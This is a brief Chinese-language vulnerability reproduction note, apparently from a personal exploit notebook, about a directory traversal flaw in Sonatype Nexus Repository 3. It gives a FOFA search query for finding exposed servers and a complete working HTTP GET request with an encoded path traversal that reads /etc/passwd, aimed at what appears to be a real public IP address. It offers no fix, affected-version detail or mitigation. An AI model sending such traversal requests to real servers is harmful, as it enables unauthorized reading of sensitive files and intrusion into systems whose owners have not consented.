# Sonatype Nexus Repository 3存在目录遍历漏洞

# 一、漏洞简介
 Sonatype Nexus Repository 3是一个universal repository manager，用于管理和代理各种软件组件、工件和依赖项。它支持多种格式，包括Java、npm、PyPI、Docker、 Helm 等。    Sonatype Nexus Repository 3 目录遍历漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。  

# 二、影响版本
+   Sonatype Nexus Repository 

# 三、资产测绘
+ fofa`app="Nexus-Repository-Manager"`
+ 特征

![1716536322398-f581723f-9518-4a47-ba84-7b1d911984ac.png](./img/On-MgBR8a1x-iDHA/1716536322398-f581723f-9518-4a47-ba84-7b1d911984ac-061105.png)

# 四、漏洞复现
```plain
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 162.19.64.171:8081
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

![1716536350863-7c1e10d0-08ba-4671-b9a6-739d4a32afbf.png](./img/On-MgBR8a1x-iDHA/1716536350863-7c1e10d0-08ba-4671-b9a6-739d4a32afbf-686669.png)



> 更新: 2024-06-01 11:14:22  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rx4pgbpa10t7pmtr>